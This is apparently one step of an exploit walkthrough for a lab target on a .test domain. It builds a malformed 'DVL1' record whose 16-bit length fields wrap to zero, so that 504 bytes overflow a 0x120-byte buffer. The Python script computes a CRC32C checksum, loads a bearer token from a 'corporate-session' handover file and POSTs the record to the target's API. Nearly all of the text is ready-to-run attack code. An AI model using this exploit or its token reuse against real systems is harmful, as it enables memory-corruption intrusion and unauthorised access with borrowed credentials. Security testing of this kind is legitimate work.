## Step 1: Build and submit the wrapped-length DVL1 record

The 16-bit sum (declared_length + header_length) must wrap to 0, with header_length=0x01f8 so 504 bytes are copied into the 0x120-byte workspace. Full request is exactly 512 bytes.

```python
import base64, hashlib, struct, ssl, urllib.request, pathlib, json

def crc32c(data):
    v = 0xFFFFFFFF
    for b in data:
        v ^= b
        for _ in range(8):
            v = (v >> 1) ^ (0x82F63B78 if v & 1 else 0)
    return v ^ 0xFFFFFFFF

payload = b"B" * 500
declared, header = 0xFE08, 0x01F8   # (declared + header) mod 2^16 == 0
record = b"DVL1" + struct.pack("<HHI", declared, header, crc32c(payload)) + payload

token = pathlib.Path("handover/corporate-session").read_text().strip()
context = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
body = json.dumps({
    "case_id": "DV-CRR-4417", "build_id": "DVL-WORKER-R5",
    "record_b64": base64.b64encode(record).decode()
}).encode()
req = urllib.request.Request(
    "https://process-view.arwc.test/api/signature-records/current",
    data=body,
    headers={"Authorization": "Bearer " + token, "X-ARWC-Tenant": "arwc",
             "Content-Type": "application/json"},
    method="POST")
resp = urllib.request.urlopen(req, context=context)
print(json.loads(resp.read()))
```
